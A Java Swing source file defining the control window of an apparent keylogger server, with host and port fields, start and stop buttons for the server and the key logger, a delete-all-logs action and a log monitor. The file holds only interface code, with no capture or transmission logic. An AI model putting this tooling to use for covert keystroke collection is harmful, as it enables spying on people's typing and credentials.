package com.hao.keylogger.views;

import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.BoxLayout;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.JToolBar;
import javax.swing.UIManager;
import javax.swing.UnsupportedLookAndFeelException;

import com.hao.keylogger.controllers.server.ServerLogController;
import com.hao.keylogger.utils.Resources;

public class ServerView extends JFrame implements ActionListener, IServerView, ILookAndFeel{
	private static final String WINDOW_TITLE = "Key logger Server";

	private static final String BTN_LOGGER = "btn_logger";

	private static final String BTN_DEL_LOG = "btn_delete_logs";

	private final String BTN_START_SERVER_NAME = "btn_startServer";

	ServerLogController controller;

	JTextField tf_host;
	JTextField tf_port;
	JTextArea ta_monitor;
	JButton btn_startServer;
	JButton btn_logger;
	JButton btn_deleteLogs;
	
	boolean isServerStarted = false;

	public ServerView() {
		setLookAndFeel();
		initFrame();		
	}

	private void initFrame() {
		setSize(700, 400);
		setTitle(WINDOW_TITLE);

		// get screen size
		Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
		setLocation(screenSize.width / 2 - this.getWidth() / 2, screenSize.height / 2 - this.getHeight() / 2);
		setMinimumSize(new Dimension(700, 400));
		setDefaultCloseOperation(EXIT_ON_CLOSE);
		
		// North panel
		JPanel northPanel = new JPanel();
		northPanel.setLayout(new BoxLayout(northPanel, BoxLayout.Y_AXIS));

		// connection panel
		JLabel lb_host = new JLabel("Host");
		tf_host = new JTextField(15);

		JLabel lb_port = new JLabel("Port");
		tf_port = new JTextField(4);

		btn_startServer = new JButton("Start server");
		btn_startServer.setName(BTN_START_SERVER_NAME);
		btn_startServer.setIcon(Resources.IC_START);
		btn_startServer.addActionListener(this);

		JPanel connPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));

		connPanel.add(lb_host);
		connPanel.add(tf_host);
		connPanel.add(lb_port);
		connPanel.add(tf_port);
		connPanel.add(btn_startServer);
		
		btn_logger = new JButton("Start key logger");
		btn_logger.setName(BTN_LOGGER);
		btn_logger.setIcon(Resources.IC_START);
		btn_logger.addActionListener(this);
		
		btn_deleteLogs = new JButton("Delete all logs");
		btn_deleteLogs.setName(BTN_DEL_LOG);
		btn_deleteLogs.setIcon(Resources.IC_DELETE);
		btn_deleteLogs.addActionListener(this);
		
		JPanel loggerPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
		loggerPanel.add(btn_logger);
		loggerPanel.add(btn_deleteLogs);
		
		northPanel.add(connPanel);
		northPanel.add(loggerPanel);
		
		// center
		ta_monitor = new JTextArea(5, 10);
		ta_monitor.setEditable(false);
		JScrollPane scrollPane = new JScrollPane(ta_monitor);

		// adding panels to main container
		getContentPane().add(northPanel, "North");
		getContentPane().add(scrollPane);

		setVisible(true);

	}

	@Override
	public void actionPerformed(ActionEvent e) {
		JButton source = (JButton) e.getSource();
		switch (source.getName()) {
		case BTN_START_SERVER_NAME:
			controller.toggleServerOnOrOff();
			break;
		case BTN_LOGGER:
			controller.toggleLogger();
			break;
		case BTN_DEL_LOG:
			int choosen = JOptionPane.showConfirmDialog(null, "Do you really want to delete all logs",
					"Key logger - Delete all logs", JOptionPane.YES_NO_OPTION);
			if (choosen == JOptionPane.YES_OPTION) {
				controller.deleteAllHostLogs();
			}
			
			break;
			default: break;
		}
	}

	@Override
	public String getHost() {
		return tf_host.getText();
	}

	@Override
	public int getPort() {
		try {
			return Integer.parseInt(tf_port.getText());
		} catch (Exception e) {
			return 0;
		}
	}

	@Override
	public String getMonitorContent() {
		return ta_monitor.getText();
	}

	@Override
	public void appendToMonitor(String msg) {
		ta_monitor.append(msg);
	}

	@Override
	public void setHost(String host) {
		tf_host.setText(host);
	}

	@Override
	public void setPort(int port) {
		tf_port.setText(port + "");
	}

	@Override
	public void setController(ServerLogController controller) {
		this.controller = controller;
	}

	public void updateViewWhenServerIsStarted() {
		btn_startServer.setText("Stop server");
		btn_startServer.setIcon(Resources.IC_STOP);
	}

	public void updateViewWhenServerIsStopped() {
		btn_startServer.setText("Start server");
		btn_startServer.setIcon(Resources.IC_START);
	}

	public void updateLoggerState(boolean isRunning) {
		if (isRunning) {
			btn_logger.setText("Stop key logger");
			btn_logger.setIcon(Resources.IC_STOP);
		}
		else {
			btn_logger.setText("Start key logger");
			btn_logger.setIcon(Resources.IC_START);
		}
	}

	@Override
	public void setLookAndFeel() {
		try {
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		} catch (ClassNotFoundException | InstantiationException | IllegalAccessException
				| UnsupportedLookAndFeelException e) {
		}
	}
}
